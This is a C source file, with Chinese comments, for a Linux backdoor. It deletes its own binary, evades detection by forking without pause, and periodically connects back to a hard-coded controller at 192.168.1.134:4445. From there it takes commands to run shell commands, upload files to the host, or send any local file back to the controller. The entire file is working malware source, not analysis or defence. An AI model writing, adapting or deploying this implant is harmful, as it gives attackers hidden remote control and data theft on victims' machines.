/*
 * this is a simple model of process hide in linux by fast and unstop fork
 */

#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>
#include <time.h>
#include <fcntl.h>
#include <sys/types.h>   
#include <sys/stat.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <pthread.h>

#ifndef SERVER_IP
    #define SERVER_IP "192.168.1.134"    //定义服务器IP地址
#endif

#define SERVER_PORT 4445         //定义服务器端口
#define PATH_MAX 1024            //定义文件路径最大长度
#define BUFSIZE 4096             //定义缓冲区大小
#define CMD_RES_SIZE 4900        //定义单条命令执行结果缓冲区大小

//get own absolute path dynamiclly
char *getpath()
{
    static char buf[PATH_MAX];
    int i;
    int rslt = readlink("/proc/self/exe", buf, PATH_MAX);
    if (rslt < 0 || rslt >= PATH_MAX)
    {
        return NULL;
    }
    buf[rslt] = '\0';
    return buf;
}

//创建阻塞型socket
int create_socket(char *host_ip, int port)
{
    int sockfd;
    struct sockaddr_in servaddr;

    if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0 ) {
#ifdef DEBUG
        printf("create socket failed!\n");
#endif
        exit(-1);
    }

    bzero(&servaddr, sizeof(servaddr));
    servaddr.sin_family = AF_INET;
    servaddr.sin_port = htons(port);
    servaddr.sin_addr.s_addr=inet_addr(host_ip);

    if (connect(sockfd, (struct sockaddr *)&servaddr, sizeof(servaddr)) < 0){
#ifdef DEBUG
        printf("connect failed!\n");
#endif
        close(sockfd);
        exit(-1);
    }
    return sockfd;
}

//从服务器请求命令
int read_cmd(int sockfd, char *result)
{
    write(sockfd, "[get cmd]\n", 10);
    memset(result, 0, BUFSIZE);
    int bytes = recv(sockfd, result, BUFSIZE, 0);
    if(bytes == -1)
    {
#ifdef DEBUG
        printf("read command from server failed\n");
#endif
        exit(-1);
    }
    return bytes;
}

/*
 * execute a shell command and return result
 */
int executeCMD(const char *cmd, char *result)   
{   
    char buf_ps[1024];   
    char ps[1024]={0};   
    FILE *pFile;   
    strcpy(ps, cmd);   
    memset(result, 0, CMD_RES_SIZE);
    if((pFile = popen(ps, "r")) != NULL)   
    {   
        int bytes;
        int total_bytes = 0;
        while(!feof(pFile))
        {
            total_bytes = fread(result, 1, CMD_RES_SIZE, pFile);
            break;
            //bytes = fread(buf_ps, 1, 1024, pFile);
            //if (bytes < 0)
            //{
            //  pclose(pFile);
            //  return total_bytes;
            //}
            //memcpy(result + total_bytes, buf_ps, bytes);
            //total_bytes += bytes;
            //if(total_bytes >= CMD_RES_SIZE - 10)   
            //    break;   
        }   
        pclose(pFile);   
        pFile = NULL;   
        return total_bytes;
    }   
    else  
    {   
#ifdef DEBUG
        printf("popen %s error\n", ps);
        exit(-1);
#endif
        return 0;
    }   
} 

/*
 *解析并执行从服务器获取到的命令
 *支持3中类型的命令：run,put,get
 *分别对应远程命令执行、文件上传、文件下载
 */
int parse_cmd(int sockfd, char *cmd, char *result)
{
    /*删除掉命令末尾的结束标志*/
    char *cmd_end = strstr(cmd, "[!FINISHED");
    cmd_end[0] = '\0';
    
    int index = 0;
    int ret = 0;


    if(strncmp(cmd, "run:", 4) == 0)
    /*远程命令执行，格式 run:[空格]commmand*/
    {
        index += 4;
        while(cmd[index] == ' ') index++;
        int line_end = index;
        while(cmd[line_end] != '\n' && line_end < strlen(cmd)-1) line_end++;
        char cmd_run[BUFSIZE];
        strncpy(cmd_run, cmd+index, line_end - index + 1);
#ifdef DEBUG
        printf("run cmd: %s\n", cmd_run);
#endif
        ret = executeCMD(cmd_run, result);
    }
    else if(strncmp(cmd, "put:", 4) == 0)
    /*文件上传，格式：put:[空格]服务器本地文件路径[空格]文件存储名*/
    {
        index += 4;
        while(cmd[index] == ' ') index++;
        while(cmd[index] != ' ') index++;
        while(cmd[index] == ' ') index++;
        int line_end = index;
        while(cmd[line_end] != '\n' && line_end < strlen(cmd)-1 && cmd[line_end] != ' ') line_end++;
        char filepath[BUFSIZE];
        
        /*读取文件存储名*/
        strncpy(filepath, cmd+index, line_end - index);
        
        /*文件传输准备*/
        write(sockfd, "ready\n", 6);
        FILE *fp = fopen(filepath, "wb");
        char buf[BUFSIZE];
        char *end_ptr = NULL;
        
        /*接收文件*/
        do {
            memset(buf, 0, BUFSIZE);
            int bytes = recv(sockfd, buf, BUFSIZE, 0);
            if(bytes > 0)
            {
                //文件接收结束标志为[!FINISHED]
                end_ptr = strstr(buf, "[!FINISHED]");
                if (end_ptr != NULL)
                {
                    bytes = end_ptr - buf;
                }
                //将接收的数据写入文件
                int wbytes = fwrite(buf, 1, bytes, fp);
                if (wbytes != bytes)
                {
#ifdef DEBUG
                    printf("something goes wrong when writing file\n");
#endif
                    break;
                }
            }
            else if(bytes == -1)
            {
                //异常结束，关闭文件后退出程序
                fclose(fp);
                exit(-1);
            }
        } while(!end_ptr);
        fclose(fp);
        write(sockfd, "recv ok\n", 8);
        return 0;
    }
    else if(strncmp(cmd, "get:", 4) == 0)
    /*下载文件，格式：get:[空格]受控端文件路径*/
    {
        index += 4;
        while(cmd[index] == ' ') index++;
        int line_end = index;
        while(cmd[line_end] != '\n' && line_end < strlen(cmd)-1 && cmd[line_end] != ' ') line_end++;
        char filepath[BUFSIZE];
        
        //读取文件名
        strncpy(filepath, cmd+index, line_end - index);
        
        //文件下载准备
        write(sockfd, "ready\n", 6);
        FILE *fp = fopen(filepath, "rb");
        if (!fp)
        {
            //文件打开失败
            write(sockfd, "[ERROR]找不到指定文件或没有权限\n", 20);
            exit(-1);
        }
        
        //开始文件传输
        char buf[BUFSIZE];
        do {
            memset(buf, 0, BUFSIZE);
            int bytes = fread(buf, 1, BUFSIZE, fp);
            if(bytes > 0)
            {
                write(sockfd, buf, bytes);
            }
            else if(bytes == -1)
            {
                break;
            }
        } while(!feof(fp));
        fclose(fp);
        write(sockfd, "[!FINISHED]\n", 12);
        write(sockfd, "send ok\n", 8);
        return 0;
    }
    return ret;
}

int main()
{
    char *self_path = getpath();

#ifndef DEBUG
    //启动程序后删除可执行文件
    remove(self_path);
#endif 
    int count = -1;
    while(1)
    {
        count += 1;
        pid_t pid = fork();
        if (pid < 0)
        {
#ifdef DEBUG
            printf("there is something wrong\n");
#endif
        }
        if (pid > 0) //父进程
        {
            /*每执行0x1000次fork则连接一次服务器*/
            if (count & 0xfff)
            {
                exit(0);
            }
            
            /* stop the program if the job isn't done in 2s */
            alarm(2);
            
            //time_t start = time(NULL);
            char cmd[BUFSIZE], result[CMD_RES_SIZE];
            int sockfd = create_socket(SERVER_IP, SERVER_PORT);
            int bytes = read_cmd(sockfd, cmd);
            if(bytes <= 0)
                return 0;
            bytes = parse_cmd(sockfd, cmd, result);
            if (bytes > 0)
                write(sockfd, result, bytes);
            close(sockfd);
            //time_t end = time(NULL);
            //printf("spend time %ds\n", end - start );
            //printf("this is a test\n");
            exit(0);
        }
        else
        {
            usleep(500);
#ifdef DEBUG
            if(count > 0x5000)
                return 0;
#endif
        }
    }
    return 0;
}
